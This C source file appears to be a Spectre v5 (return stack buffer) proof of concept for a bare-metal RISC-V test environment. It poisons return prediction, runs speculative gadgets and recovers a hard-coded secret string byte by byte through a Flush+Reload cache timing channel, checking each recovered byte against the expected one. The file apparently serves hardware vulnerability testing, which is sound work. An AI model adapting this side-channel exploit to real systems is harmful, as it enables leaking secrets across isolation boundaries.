#include <klib.h>
#include <stdint.h>

#include "xs-spectre-utils.h"

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef V5_ROUNDS
#define V5_ROUNDS 64
#endif

#ifndef V5_TRAIN_PASSES
#define V5_TRAIN_PASSES 8
#endif

#ifndef V5_RAS_DEPTH
#define V5_RAS_DEPTH 24
#endif

#ifndef V5_RAS_FILL_DEPTH
#define V5_RAS_FILL_DEPTH V5_RAS_DEPTH
#endif

#ifndef V5_IN_PLACE_DELAY
#define V5_IN_PLACE_DELAY 128
#endif

#ifndef V5_GADGET_MODE
#define V5_GADGET_MODE 0
#endif

#ifndef V5_ATTACK_SAME_ROUNDS
#define V5_ATTACK_SAME_ROUNDS 1
#endif

#ifndef V5_FLUSH_SECRET
#define V5_FLUSH_SECRET 0
#endif


#ifndef CANDIDATE_WINDOW_FLUSH
#define CANDIDATE_WINDOW_FLUSH 0
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 0
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 2
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 1
#endif


static uint8_t channel[PROBE_BYTES] __attribute__((aligned(4096)));
static const char secret[] = "S3CreT";
static volatile uint64_t leak_guard;
static volatile uint8_t temp;

extern void xs_v5_recursive_ret_probe(const uint8_t *secret_ptr,
                                      uint8_t *probe);
extern void xs_v5_loop_ret_probe(const uint8_t *secret_ptr, uint8_t *probe);
extern void xs_v5_frame_dump_probe(const uint8_t *secret_ptr, uint8_t *probe);
extern void xs_v5_fill_ras(void);

static void flush_probe(void)
{
#if CANDIDATE_WINDOW_FLUSH
  for (uint64_t i = 0; i < xs_probe_count(); ++i) {
    uint64_t candidate = xs_probe_value(i);
    xs_flush_cache_line(&channel[candidate * L1_BLOCK_SZ_BYTES]);
  }
  xs_fence();
#else
  xs_flush_probe(channel);
#endif
}

static __attribute__((noinline)) void xs_v5_sonicboom_spec_func(
  const uint8_t *secret_ptr)
{
  temp &= channel[*secret_ptr * L1_BLOCK_SZ_BYTES];
  leak_guard += temp;
}

static void run_v5_gadget(const char *addr)
{
  xs_v5_fill_ras();
#if V5_GADGET_MODE == 2
  xs_v5_sonicboom_spec_func((const uint8_t *)addr);
#elif V5_GADGET_MODE == 1
  xs_v5_loop_ret_probe((const uint8_t *)addr, channel);
#elif V5_GADGET_MODE == 3
  xs_v5_frame_dump_probe((const uint8_t *)addr, channel);
#else
  xs_v5_recursive_ret_probe((const uint8_t *)addr, channel);
#endif
}

static void read_byte(const char *addr, uint8_t result[2],
                      uint64_t score[2], uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];
  memset(hits, 0, sizeof(hits));

  for (int round = V5_ROUNDS; round > 0; --round) {
    for (int same = 0; same < V5_ATTACK_SAME_ROUNDS; ++same) {
      flush_probe();
#if V5_FLUSH_SECRET
      xs_flush_cache_line((void *)addr);
#endif
      xs_fence();

      run_v5_gadget(addr);

      for (uint64_t i = 0; i < xs_probe_count(); ++i) {
        uint64_t candidate = xs_probe_value(i);
        volatile uint8_t *probe = &channel[candidate * L1_BLOCK_SZ_BYTES];
        uint64_t elapsed = xs_probe_time(probe);
        if (elapsed <= threshold)
          hits[candidate]++;
      }
    }
#if EARLY_STOP
    uint8_t early_idx[2] = {0, 0};
    uint64_t early_score[2] = {0, 0};
    xs_top_two_idx(hits, PROBE_ENTRIES, early_idx, early_score);
    if (early_score[0] >= EARLY_STOP_MIN_SCORE &&
        early_score[0] >= early_score[1] + EARLY_STOP_GAP)
      break;
#endif
  }

  xs_top_two_idx(hits, PROBE_ENTRIES, result, score);
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  uint64_t measured_threshold;
  uint64_t threshold;
  uint64_t len = xs_limit_len(sizeof(secret) - 1, SECRET_SZ);

  memset(channel, 1, sizeof(channel));
  xs_probe_init(channel);

  measured_threshold = xs_calibrate_threshold(channel);
  threshold = xs_select_threshold(measured_threshold);

  printf("[v5-priv] model=frontend-ras-priv attacker=M victim=M isolation=none service=direct-call mode=%s secret=S3CreT\n",
         V5_GADGET_MODE == 2 ? "sonicboom-direct" :
         (V5_GADGET_MODE == 3 ? "frame-dump-ret" :
          (V5_GADGET_MODE == 1 ? "ret-loop" : "recursive-ret")));
  printf("[v5-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d full_probe=%d candidates=%d window_flush=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD, FULL_BYTE_PROBE,
         (int)xs_probe_count(), CANDIDATE_WINDOW_FLUSH);
  printf("[v5-priv] rounds=%d same=%d train=%d ras_depth=%d ras_fill=%d delay=%d reading %lu bytes\n",
         V5_ROUNDS, V5_ATTACK_SAME_ROUNDS, V5_TRAIN_PASSES, V5_RAS_DEPTH,
         V5_RAS_FILL_DEPTH, V5_IN_PLACE_DELAY, len);

  for (uint64_t i = 0; i < len; ++i) {
    read_byte(&secret[i], result, score, threshold);
    leak_guard += result[0];

    printf("[v5-priv] byte %2lu: %c (0x%02x) score=%lu\n",
           i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0], score[0]);
    printf("[v5-priv] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1], score[1]);
    printf("[v5-priv] check %lu 0x%02x 0x%02x\n", i, result[0],
           (uint8_t)secret[i]);
  }

  printf("[v5-priv] guard=%lu\n", leak_guard);
  return 0;
}
